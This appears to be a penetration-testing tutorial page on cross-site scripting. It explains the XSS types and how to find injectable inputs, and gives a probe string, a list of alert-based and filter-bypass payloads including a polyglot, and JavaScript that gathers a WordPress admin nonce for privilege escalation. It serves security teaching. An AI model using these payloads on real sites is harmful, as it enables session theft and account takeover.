# Theory

> [_Cross-Site Scripting_](https://owasp.org/www-community/attacks/xss/) (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

This takes advantage of improper *sanitization* (one of the most important features of a well defended web application). These are the weak points that an attacker can abuse by injecting and executing malicious code.

**Main Types**

*Stored*: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on were the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it's theoretically can't affect other users.

*Reflected*: the user input is reflected but not stored. It usually happens on search forms, login pages and pages that reflect content for one response only. When the reflected vulnerable input is in the URI (`http://www.target.com/search.php?keyword=INJECTION`) attackers can craft a malicious URI and send it to the victims hoping they will browse it. This form of XSS usually requires phishing and attackers can be limited in the length of the malicious payload (cf. [this](https://serpstat.com/blog/how-long-should-be-the-page-url-length-for-seo/)).

*DOM-based*: while stored and reflected XSS attacks exploit vulnerabilities in the server-side code, a DOM-based XSS exploits client-side ones (e.g. JavaScript used to help dynamically render a page). DOM-based XSS usually affect user inputs that are temporarily reflected, just like reflected XSS attacks.

# Practice

## Finding Vectors

Find out input vectors that are either stored or reflected.

- URI parameters for reflected and DOM-based XSS
- Other user inputs in forums, chats, comments, posts, and other stored content for stored XSS
- HTTP headers like Cookies (and even User-Agents in some cases)

The following [website](https://transformations.jobertabma.nl/) ([GitHub project](https://github.com/jobertabma/transformations)) can help identify transformations applied to user inputs. This can help bypass filters and transformations to exploit XSS attacks.

The following payload is used for testing [SQL injections](https://www.thehacker.recipes/web/inputs/sqli), XSS (Cross-Site Scripting) and [SSTI (Server-Side Template Injection)](https://www.thehacker.recipes/web/inputs/ssti).

```bash
'"<svg/onload=prompt(5);>{{7*7}}
```

Tools like [XSStrike](https://github.com/s0md3v/XSStrike) (Python), [XSSer](https://github.com/epsylon/xsser) (Python), and [Dalfox](https://github.com/hahwul/dalfox) (Go) can also help in finding and exploiting XSS vulnerable input vectors by fuzzing them with unique payloads and then searching for unique patterns in the responses.

## Payloads

```javascript
# Standard XSS Payload
<script>alert('XSS');</script>

# Input tag escape
"><script>alert('XSS');</script>

# Escape textarea tag
</textarea><script>alert('XSS');</script>

# Escape Javascript code
';alert('XSS');//

# Bypass filters that strip out malicious words such like "script"
<sscriptcript>alert('XSS');</sscriptcript>

# Polygot payload (Can bypass multiple filters)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS)//>\x3e
```

## Privilege Escalation

Once we're able to store and execute Javascript on the website, we start looking to escalate privileges via *cookies*.

Websites use cookies to track [_state_](https://en.wikipedia.org/wiki/Session_\(computer_science\)) and information about users. Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers: _Secure_ and _HttpOnly_.

The [_Secure_](https://en.wikipedia.org/wiki/Secure_cookie) flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

The [_HttpOnly_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent [_Cross-Site-Request-Forgery_](https://owasp.org/www-community/attacks/csrf) (CSRF) attacks.

### Gathering Nonces

```bash
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```



# Resources

[https://xss-game.appspot.com/](https://xss-game.appspot.com/)

[https://excess-xss.com/](https://excess-xss.com/)

[https://owasp.org/www-community/attacks/DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt